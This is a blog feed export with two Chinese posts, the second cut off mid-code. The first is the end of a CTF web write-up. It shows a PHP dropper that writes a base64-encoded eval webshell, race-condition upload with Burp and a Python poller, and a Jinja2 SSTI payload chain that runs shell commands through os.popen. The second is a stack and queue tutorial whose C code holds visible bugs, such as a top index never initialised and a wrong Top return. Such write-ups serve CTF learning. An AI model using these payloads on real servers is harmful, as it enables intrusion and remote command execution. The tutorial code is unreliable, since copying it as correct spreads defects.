alt="image-20231015131750553" /></p><p>复制到本地查看。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015131835200.png" alt="image-20231015131835200" /></p><p>代码末尾发现hint，根据提示访问/Upl00000000ad.php。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015131944047.png" alt="image-20231015131944047" /></p><p>发现是一个文件上传页面，从这里可以确定这道题其实是一个文件上传漏洞题。</p><p>上传测试木马。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015132036657.png" alt="image-20231015132036657" /></p><p>木马被检测到，同时返回了一个文件上传的地址，访问。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015132156329.png" alt="image-20231015132156329" /></p><p>下载图片打开，发现内容并没有被更改。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015132346619.png" alt="image-20231015132346619" /></p><div align=center >下载下来被火绒秒删……说明是我写的木马没错</div><p>既然写入的一句话木马没有被修改，尝试用蚁剑连接webshell，连接失败，说明文件没有被执行，所以上传图片马的方法也可以排除了。</p><p>既然php后缀被拦截，抓包修改文件名试试上传其他的文件后缀。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015132744364.png" alt="image-20231015132744364" /></p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015132833820.png" alt="image-20231015132833820" /></p><p>经过实验，只有图片格式后缀不被拦截，确定拦截方式为白名单。尝试使用%00截断绕过。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015133056288.png" alt="image-20231015133056288" /></p><p>绕过失败。</p><p>此时只剩下一种方法，条件竞争。条件竞争，就是把文件上传到服务器，而服务器判断文件是否合法需要时间，在此时访问上传的木马文件，就可以实现植入后门的操作。当然，这样要求的时间很短速度很快，仅凭手速是达不到的，我们需要不断的上传木马文件同时发送访问请求，这与题目名upload_quick不谋而合。至此，基本可以确定是条件竞争上传。</p><p>要确定一个题目是条件竞争，我们首先要知道文件上传的位置才能进行访问。这里虽然每次返回的都是一串随机字符文件名，但都是在uploads文件夹下，所以我们大胆猜测上传的文件会被暂时储存在uploads下，如果服务器判定文件非法则会修改其文件名和文件后缀返回给用户。也就是说，我们要不断地上传木马文件的同时，不断的访问uploads/xxx.php。</p><p>那么准备工作开始。</p><p>首先准备条件竞争的木马。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+&#x27;</span>;</span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell.php&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>主要的功能是如果木马被执行/访问成功，则写入另一个木马shell.php，这样即使自己被删掉也可以留下一个后门。</p><p>这里需要写入的内容使用了base64加密，原因是如果你直接将$a=一句话木马，生成的文件中将不会含有$_POST[‘xxx’] ，所以我们需要使用base64加密。</p><p>接下来准备bp爆破，不断地向服务器上传木马文件，将上传文件的数据包抓包发送给intruder模块。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015134611264.png" alt="image-20231015134611264" /></p><p>尽管后面使用<strong>Null payload</strong>，但仍然需要<strong>设定一个变量</strong>。而且这个变量最好是空格作为变量。如果随意选取一个变量，他会把你的变量变成空。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015134740689.png" alt="image-20231015134740689" /></p><p>payload配置类型为<strong>Null payload</strong>，并无限重复发送。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015134801650.png" alt="image-20231015134801650" /></p><p>这里本来还应该开启多线程上传增加成功率，但是我的bp版本没有多线程的功能，所以我开启了两个bp同时上传文件，配置方法相同。</p><p>最后是Python监听脚本，用来不断的发送访问请求，同时监听是否访问成功，脚本代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://43.248.97.200:40037/uploads/tiaojian3.php&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> html.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;YES,you upload it!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;NO&quot;</span>)</span><br></pre></td></tr></table></figure><p>万事俱备只欠东风，启动bp爆破和Python监听脚本。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015135140655.png" alt="image-20231015135140655" /></p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015135231566.png" alt="image-20231015135231566" /></p><p>成功访问，此时用蚁剑尝试链接webshell。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015135347012.png" alt="image-20231015135347012" /></p><p>连接成功，翻看目录找到flag。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015135443813.png" alt="image-20231015135443813" /></p><p>flag为<code>XSCTF&#123;1iL3_UP1oOOO0oOO4d_In7ereS7iNG_fe2accc0eed4&#125;</code>。</p><h3 id="你买车票没"><a class="markdownIt-Anchor" href="#你买车票没"></a> 你买车票没</h3><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015162100798.png" alt="image-20231015162100798" /></p><p>最mhy的一集……首先进入容器。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015162205624.png" alt="image-20231015162205624" /></p><p>一个简陋的登录页面，十分简陋，查看源代码也没有发现有价值的信息。尝试抓包，同样没有什么进展。不管输入什么，都会弹出窗口显示没有车票。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015162323357.png" alt="image-20231015162323357" /></p><p>尝试SQL注入，用sqlmap扫了两小时无果，于是考虑SSTI模板注入。</p><p>传入参数49，返回49，说明改题存在SSTI注入漏洞，注入点为用户名/name。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015162511752.png" alt="image-20231015162511752" /></p><p>做题思路如下：</p><blockquote><p>通过python的对象的继续来一步步实现文件的读取和命令执行的<br />首先用__class__读取当前类对象的类<br />然后用__mro__或者__base__寻找基类<br />然后用__subclasses__找命令执行或者文件操作的模块<br />然后使用__init__声明<br />然后使用__globals__引用模块<br />————————————————<br />原文链接：<a href="https://blog.csdn.net/weixin_46342884/article/details/123246354">https://blog.csdn.net/weixin_46342884/article/details/123246354</a></p></blockquote><p>我们按照这个思路一步步做题。</p><p>首先传入49测试确实存在SSTI注入，我们已经做过了。</p><p>然后，读取当前字符的类</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;config.__class__&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015163336358.png" alt="image-20231015163336358" /></p><p>这一坨乱码是HTML编码，我们暂时不用管它，不过为了方便阅读起见，我把解码后的文本丢在这里<code>&lt;class 'flask.config.Config'&gt;,</code>。</p><p>接着我们查找基类，构造如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;config.__class__.__mro__&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015163540505.png" alt="image-20231015163540505" /></p><p><code>(&lt;class 'flask.config.Config'&gt;, &lt;class 'dict'&gt;, &lt;class 'object'&gt;)</code></p><p>继续选择基类查找命令执行或者文件操作的模块：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;config.__class__.__mro__[2].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure><p>因为这里object在第三位，而python是从0开始计数的所以写2，为什么选择object，因为它是所有类的父类，默认所有的类都继承至Object类。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015163744611.png" alt="image-20231015163744611" /></p><p>得到的内容有亿点点多……</p><p>首先把它们全部转为HTML格式，然后扔Python跑脚本。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;此处省略亿点点内容&#x27;&#x27;&#x27;</span></span><br><span class="line">s=<span class="string">&#x27;&#x27;&#x27;?id=[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, ...., &lt;class &#x27;werkzeug._reloader.ReloaderLoop&#x27;&gt;],没买车票不能上车!!!&quot;);&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">s=s.split(<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;ssti查找结果.txt&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> p:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        p.write(i+<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后去新的文本文件里查找要用的模块popen。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015164139328.png" alt="image-20231015164139328" /></p><p>第352个，减一就是第351个数组元素。</p><p>最后引用模块执行命令。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;config.__class__.__mro__[2].__subclasses__()[351].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015164848512.png" alt="image-20231015164848512" /></p><p>回显直接不见了，好家伙，原来在源码里。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015164915434.png" alt="image-20231015164915434" /></p><p>发现flag，构造payload得到flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;config.__class__.__mro__[2].__subclasses__()[351].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat+flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>如果是在name框里传参直接把<code>cat+flag</code>改成<code>cat flag</code>就好。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015165314336.png" alt="image-20231015165314336" /></p><p>flag为<code>XSCTF&#123;SsT1_MilKTea_m1LktEa!&#125;</code></p><hr /><p>完结线！撒花~✿✿ヽ(°▽°)ノ✿。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/300008.jpg" alt="300008" /></p>]]></content>
      
      
      <categories>
          
          <category> CTF Write Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构什锦（三）——栈与队列篇</title>
      <link href="/posts/e275e13c643c/"/>
      <url>/posts/e275e13c643c/</url>
      
        <content type="html"><![CDATA[<p>这里我们来学习队列和栈的数据结构。</p><hr /><h1 id="栈"><a class="markdownIt-Anchor" href="#栈"></a> 栈</h1><h2 id="什么是栈"><a class="markdownIt-Anchor" href="#什么是栈"></a> 什么是栈</h2><p><strong>栈</strong>（stack）是一个有序序列，只能在称为栈顶的一段进行数据的插入和删除的操作，最后一个插入的元素是第一个被删除的元素。所以栈也被称作“先进后出”表（LIFO）或“后进先出”表（FILO）。</p><p>对栈操作的方法有特殊的称呼。比如把数据插入栈，称为向栈<strong>压入</strong>（push）一个元素，而把数据从栈中删除，我们称为从栈<strong>弹出</strong>（pop）一个元素。从空栈中弹出元素会发生<strong>下溢</strong>（underflow），而向满栈压入元素会发生<strong>上溢</strong>（overflow）。我们把上溢和下溢统称为<strong>异常</strong>（exception）。</p><h2 id="栈的抽象数据类型adt"><a class="markdownIt-Anchor" href="#栈的抽象数据类型adt"></a> 栈的抽象数据类型/ADT</h2><p>为了简单起见，我们先把栈的内容数据类型设置为整形int。</p><h3 id="操作"><a class="markdownIt-Anchor" href="#操作"></a> 操作</h3><ul><li>Push(int data)：将元素data压入栈中</li><li>int Pop()：从栈顶中弹出元素，并返回该元素的值。</li><li>int Top()：返回栈顶元素的值，但是不删除该元素</li><li>int Size()：返回栈中元素个数</li><li>int IsEmptyStack()：判断栈是否为空</li><li>int IsFullStack()：判断栈是否为满</li></ul><h3 id="异常"><a class="markdownIt-Anchor" href="#异常"></a> 异常</h3><p>有时候栈的操作不能执行，比如向空栈中弹出元素或者向满栈中压入元素，此时Push()函数和Pop()函数无法正常执行，这时我们要求程序要抛出（throw）一个异常。</p><h2 id="栈的应用"><a class="markdownIt-Anchor" href="#栈的应用"></a> 栈的应用</h2><ul><li>符号平衡</li><li>中缀表达式转后缀表达式</li><li>后缀表达式的计算</li><li>函数调用的实现</li><li>查找划分</li><li>Web浏览器的访问历史</li><li>文本编辑器的撤销功能</li><li>HTML和XML的标签匹配</li></ul><h2 id="栈的实现"><a class="markdownIt-Anchor" href="#栈的实现"></a> 栈的实现</h2><p>栈的抽象数据类型有几种实现方法，下面我们介绍三种。</p><ul><li>基于简单数组的实现</li><li>基于动态数组的实现</li><li>基于链表的实现</li></ul><h3 id="基于简单数组的实现"><a class="markdownIt-Anchor" href="#基于简单数组的实现"></a> 基于简单数组的实现</h3><p>在数组中，我们从左向右的给数组添加元素，并使用一个辅助变量跟踪栈顶元素在数组中的下标。</p><p>数组实现的栈是会变满的，所以可能发生上溢异常。当数组为空时弹出元素也会发生下溢异常。</p><p>以下是代码的实现。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ArrayStack</span> &#123;</span></span><br><span class="line"><span class="type">int</span> top;</span><br><span class="line"><span class="type">int</span> capacity;</span><br><span class="line"><span class="type">int</span>* <span class="built_in">array</span>;<span class="comment">//一个辅助指针指向栈顶</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> ArrayStack* <span class="title function_">CreateStack</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ArrayStack</span>* <span class="title">S</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ArrayStack));</span><br><span class="line"><span class="keyword">if</span> (!S)<span class="comment">//如果创建新栈失败返回空</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">S-&gt;capacity = <span class="number">1</span>;<span class="comment">//数组的容量，应该是初始化时可以更改的</span></span><br><span class="line">S-&gt;top - <span class="number">1</span>;<span class="comment">//最开始空栈的top为-1代表不存在，一个元素时为0，对应数组的0下标</span></span><br><span class="line">S-&gt;<span class="built_in">array</span> = <span class="built_in">malloc</span>(S-&gt;capacity * <span class="keyword">sizeof</span>(<span class="type">int</span>));<span class="comment">//声明一个数组用来储存压入栈的数据</span></span><br><span class="line"><span class="keyword">if</span> (!S-&gt;<span class="built_in">array</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> S;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">IsEmptyStack</span><span class="params">(<span class="keyword">struct</span> ArrayStack* S)</span> &#123;</span><br><span class="line"><span class="keyword">return</span>(S-&gt;top == <span class="number">-1</span>);<span class="comment">//如果相等返回1，否则返回0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">IsFullStack</span><span class="params">(<span class="keyword">struct</span> ArrayStack* S)</span> &#123;</span><br><span class="line"><span class="keyword">return</span>(S-&gt;top == S-&gt;capacity - <span class="number">1</span>);<span class="comment">//同上</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Push</span><span class="params">(<span class="keyword">struct</span> ArrayStack* S, <span class="type">int</span> data)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (IsFullStack(S))</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stack overflow&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">S-&gt;<span class="built_in">array</span>[++S-&gt;top] = data;</span><br><span class="line"><span class="comment">/*首先栈顶标识符自增，然后向数组对应下标存入元素*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Pop</span><span class="params">(<span class="keyword">struct</span> ArrayStack* S)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (IsEmptyStack(S)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stack is empty&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="comment">/*返回栈顶的元素，然后top减1*/</span></span><br><span class="line"><span class="keyword">return</span>(S-&gt;<span class="built_in">array</span>[S-&gt;top--]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DeleteStack</span><span class="params">(<span class="keyword">struct</span> ArrayStack* S)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (S) &#123;</span><br><span class="line"><span class="keyword">if</span> (S-&gt;<span class="built_in">array</span>) &#123;</span><br><span class="line"><span class="built_in">free</span>(S-&gt;<span class="built_in">array</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>(S);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法存在一个局限性，就是数组的大小需要事先指定，而且超出数组大小时压入元素会发生上溢。</p><p>最后总结一下使用静态数组实现栈的思路。我们使用一个下标变量top，用它来指向栈中最近插入元素的位置。为了插入一个元素，我们增加top元素的值，并把新元素放到top指定的位置上。为了弹出一个元素，我们先返回top上的元素，然后让top减1。</p><h3 id="基于动态数组的实现"><a class="markdownIt-Anchor" href="#基于动态数组的实现"></a> 基于动态数组的实现</h3><p>因为使用静态数组时栈的大小有限制，会发生上溢异常。为了动态的调整栈的大小，我们可以使用动态数组，当我们使用动态数组时，我们有两种思路。</p><p>首先是当每一次栈满时，我们就把栈的大小加1。但这样会造成巨大的时间开销。假如我们的数组初始长度为1，最后长度为n-1，当满栈时我们就要新建一个长度为n的数组，然后将n-1个元素复制过来。而这之前我们已经过（1+2+……+n-1）次复制操作，这样的算法时间复杂度为O(n<sup>2</sup>)。</p><p>另一种方法就是重复翻倍的思想。每当栈满时，我们就创建一个长度为当前数组的两倍的数组，再将元素复制过去。这样我们的算法时间复杂度就变成了O(n)。</p><p>注意，过多的翻倍操作可能会导致内存上溢。</p><h3 id="基于链表的实现"><a class="markdownIt-Anchor" href="#基于链表的实现"></a> 基于链表的实现</h3><p>利用链表也可以实现栈。Push操作通过在链表的首部插入元素来实现，而Pop操作则是删除链表的头部元素来实现。</p><p>以下是代码实现。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stack</span> &#123;</span></span><br><span class="line"><span class="type">int</span> data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stack</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> Stack* <span class="title function_">CreateStack</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Push</span><span class="params">(<span class="keyword">struct</span> Stack** top, <span class="type">int</span> data)</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stack</span>* <span class="title">temp</span>;</span></span><br><span class="line">temp = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Stack));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!temp)<span class="comment">//新节点申请不成功则返回空</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">temp-&gt;data = data;</span><br><span class="line">temp-&gt;next = *top;<span class="comment">//新节点指向原头节点</span></span><br><span class="line"></span><br><span class="line">*top = temp;<span class="comment">//修改头指针指向新节点</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">IsEmptyStack</span><span class="params">(<span class="keyword">struct</span> Stack* top)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> (top == <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Pop</span><span class="params">(<span class="keyword">struct</span> Stack** top)</span> &#123;</span><br><span class="line"><span class="type">int</span> data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stack</span>* <span class="title">temp</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IsEmptyStack(top))</span><br><span class="line"><span class="keyword">return</span> INT_MIN;<span class="comment">//如果是空栈，则返回一个最小int值</span></span><br><span class="line"></span><br><span class="line">temp = *top;<span class="comment">//临时变量储存要弹出的位置</span></span><br><span class="line">*top = (*top)-&gt;next;<span class="comment">//将头指针指向下一个变量</span></span><br><span class="line">data = temp-&gt;data;</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(temp);<span class="comment">//释放弹出数据的位置</span></span><br><span class="line"><span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Top</span><span class="params">(<span class="keyword">struct</span> Stack* top)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (IsEmptyStack(top))</span><br><span class="line"><span class="keyword">return</span> INT_MIN;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> (top-&gt;next)-&gt;data;<span class="comment">//返回栈顶元素</span></span><br><span class="line"><span class="comment">/*注意这里top指向的节点是一个*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DeleteStack</span><span class="params">(<span class="keyword">struct</span> Stack** top)</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stack</span>* <span class="title">temp</span>, * <span class="title">p</span>;</span></span><br><span class="line">p = *top;<span class="comment">//p为头指针的一个副本</span></span><br><span class="line"><span class="keyword">while</span> (p-&gt;next) &#123;</span><br><span class="line"><span class="comment">//循环条件 p指向的下一个元素不为空</span></span><br><span class="line">temp = p-&gt;next;</span><br><span class="line">p-&gt;next = temp-&gt;next;</span><br><span class="line"><span class="built_in">free</span>(temp);<span class="comment">//释放临时变量指向的节点</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>(p);<span class="comment">//释放最后一个节点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="队列"><a class="markdownIt-Anchor" href="#队列"></a> 队列</h1><h2 id="什么是队列"><a class="markdownIt-Anchor" href="#什么是队列"></a> 什么是队列</h2><p>队列（queue）是一个有序序列，只能在序列的一段（rear）插入元素，而在另一端（front）进行删除操作。最先被插入的元素也是最先被删除的元素。所以队列又被称为“先进先出”表（FIFO）或者“后进后出”表（LILO）</p><p>与栈类似，队列的插入和删除也有特定的称谓。队列在队尾进行插入操作我们称为入列（EnQueue）操作，删除队首元素，我们称之为出列（Dequeue）操作。</p><p>对空队列执行出列操作称为下溢（underflow）错误，对满队列执行入列操作称为上溢（overflow）错误。这些错误统称为异常（exception）。</p><h2 id="队列的抽象数据类型adt"><a class="markdownIt-Anchor" href="#队列的抽象数据类型adt"></a> 队列的抽象数据类型/ADT</h2><p>假设数据元素为整形。</p><h3 id="操作-2"><a class="markdownIt-Anchor" href="#操作-2"></a> 操作</h3><ul><li>EnQueue(int data)：插入元素data到队列的队尾</li><li>int DeQueue()：删除队首元素，并返回该元素的值</li><li>int Front()：返回队首元素的值，但不删除首元素</li><li>int QueueSize()：返回队列的元素个数</li><li>int IsEmptyQueue()：判断队列是否为空</li></ul><h3 id="异常-2"><a class="markdownIt-Anchor" href="#异常-2"></a> 异常</h3><p>和栈相同，对空队列执行DeQueue会抛出空队列异常，对满队列执行EnQueue会抛出满队列异常。</p><h2 id="队列的应用"><a class="markdownIt-Anchor" href="#队列的应用"></a> 队列的应用</h2><ul><li>操作系统按照到达的顺序进行作业</li><li>模拟现实中的队列问题</li><li>异步数据传输</li><li>确定超市需要的收银员人数</li><li>算法的辅助数据结构</li><li>其他数据结构的组成部分</li></ul><h2 id="队列的实现"><a class="markdownIt-Anchor" href="#队列的实现"></a> 队列的实现</h2><p>队列的实现与栈类似，有以下三种方法：</p><ul><li>基于简单数组的实现</li><li>基于循环数组的实现</li><li>基于链表的实现</li></ul><h3 id="基于简单循环数组的实现"><a class="markdownIt-Anchor" href="#基于简单循环数组的实现"></a> 基于简单循环数组的实现</h3><p>我们利用循环数组实现对队列ADT的简单实现，并用两个元素追踪队首和队尾元素。通常，用front指向队首元素，用rear指向队尾元素。</p><p>用来储存队列元素的数组可能会变满，此时EnQueue操作将抛出满队异常。同样的，对于空队列执行DeQueue操作将抛出空队异常。</p><p>初始化时，front和rear均指向-1，表示此时队列为空。</p><p>以下是实现的代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:6031)</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ArrayQueue</span> &#123;</span></span><br><span class="line"><span class="type">int</span> front, rear;</span><br><span class="line"><span class="type">int</span> capacity;</span><br><span class="line"><span class="type">int</span>* <span class="built_in">array</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> ArrayQueue *<span class="title function_">Queue</span><span class="params">(<span class="type">int</span> size)</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ArrayQueue</span>* <span class="title">Q</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ArrayQueue));</span><br><span class="line"><span class="keyword">if</span> (!Q)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;<span class="comment">//如果创建内存失败，返回空</span></span><br><span class="line">Q-&gt;capacity = size;<span class="comment">//初始化队列的容量</span></span><br><span class="line">Q-&gt;front = Q-&gt;rear = <span class="number">-1</span>;</span><br><span class="line">Q-&gt;<span class="built_in">array</span> = <span class="built_in">malloc</span>(Q-&gt;capacity * <span class="keyword">sizeof</span>(<span class="type">int</span>));<span class="comment">//申请一片内存作为数组，来储存队列元素</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!Q-&gt;<span class="built_in">array</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;<span class="comment">//假如数组申请失败，则返回空</span></span><br><span class="line"><span class="keyword">return</span> Q;<span class="comment">//返回初始化成功的队列数据对象</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">IsEmptyQueue</span><span class="params">(<span class="keyword">struct</span> ArrayQueue* Q)</span> &#123;</span><br><span class="line"><span class="keyword">return</span>(Q-&gt;front == <span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">IsFullQueue</span><span class="params">(<span class="keyword">struct</span> ArrayQueue* Q)</span> &#123;</span><br><span class="line"><span class="keyword">return</span>((Q-&gt;rear + <span class="number">1</span>) % Q-&gt;capacity == Q-&gt;front);<span class="comment">//如果队尾位置后即为队首说明队满</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">QueueSize</span><span class="params">(<span class="keyword">struct</span> ArrayQueue* Q)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> (Q-&gt;capacity - Q-&gt;front + Q-&gt;rear + <span class="number">1</span>) % Q-&gt;capacity;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">EnQueue</span><span class="params">(<span class="keyword">struct</span> ArrayQueue* Q, <span class="type">int</span> data)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (IsFullQueue(Q)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Queue Overflow!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">Q-&gt;rear = (Q-&gt;rear + <span 